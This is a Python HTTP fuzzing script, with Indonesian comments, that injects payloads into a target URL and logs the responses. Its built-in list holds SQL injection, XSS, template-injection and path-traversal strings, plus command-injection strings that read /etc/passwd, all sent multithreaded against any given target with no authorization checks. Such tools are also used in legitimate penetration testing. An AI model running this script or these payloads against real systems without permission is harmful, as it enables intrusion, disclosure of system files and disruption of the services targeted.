#!/usr/bin/env python3
"""
HTTP Fuzzer - Fuzz HTTP parameters, headers, and paths
Mengirim banyak request dengan payload untuk menemukan bug.
Usage: python http_fuzzer.py -u http://target.com/page?id=FUZZ -w wordlist.txt
"""
import requests
import argparse
import sys
import time
import concurrent.futures


SQUID_FUZZ_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "../etc/passwd",
    "..\..\..\windows\win.ini",
    "|/bin/cat /etc/passwd",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "%00",
    "%0a",
    "%0d%0a",
    "127.0.0.1",
    "localhost",
    "192.168.0.1",
    "${7*7}",
    "{{7*7}}",
    "A" * 1000,
    "A" * 10000,
]


def fuzz_request(session, method, url, fuzz_word, timeout=10):
    try:
        target = url.replace("FUZZ", fuzz_word)
        if method.upper() == "GET":
            r = session.get(target, timeout=timeout)
        else:
            r = session.post(target, timeout=timeout)
        return {
            "payload": fuzz_word,
            "status": r.status_code,
            "length": len(r.text),
            "time": r.elapsed.total_seconds(),
        }
    except requests.exceptions.RequestException as e:
        return {
            "payload": fuzz_word,
            "error": str(e),
        }


def main():
    parser = argparse.ArgumentParser(description="HTTP Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL with FUZZ marker")
    parser.add_argument("-w", "--wordlist", help="Wordlist file")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-t", "--threads", type=int, default=20, help="Thread count")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests")
    parser.add_argument("--builtin", action="store_true", help="Use built-in payload list")
    parser.add_argument("--show-code", default="all", help="Filter status codes (comma-separated or 'all')")
    args = parser.parse_args()

    if "FUZZ" not in args.url:
        print("[!] URL harus mengandung 'FUZZ' marker")
        sys.exit(1)

    payloads = []
    if args.wordlist:
        try:
            with open(args.wordlist, "r", errors="ignore") as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {args.wordlist}")
            sys.exit(1)
    elif args.builtin:
        payloads = SQUID_FUZZ_PAYLOADS
    else:
        print("[!] Butuh --wordlist atau --builtin")
        sys.exit(1)

    print(f"[*] Target: {args.url}")
    print(f"[*] Method: {args.method}")
    print(f"[*] Payloads: {len(payloads)}")
    print(f"[*] Threads: {args.threads}")
    print("-" * 80)
    print(f"{'Payload':<35}{'Status':<10}{'Length':<10}{'Time'}")
    print("-" * 80)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_payload = {executor.submit(fuzz_request, session, args.method, args.url, p): p for p in payloads}
        completed = 0
        for future in concurrent.futures.as_completed(future_to_payload):
            completed += 1
            if args.delay > 0:
                time.sleep(args.delay)
            result = future.result()
            if "error" in result:
                print(f"{result['payload'][:33]:<35}ERROR   {result['error'][:30]}")
            else:
                if args.show_code != "all":
                    codes = args.show_code.split(",")
                    if str(result["status"]) not in codes:
                        continue
                print(f"{result['payload'][:33]:<35}{result['status']:<10}{result['length']:<10}{result['time']:.2f}s")
                found.append(result)

    print("-" * 80)
    print(f"[+] Done. {len(found)} responses logged.")


if __name__ == "__main__":
    main()

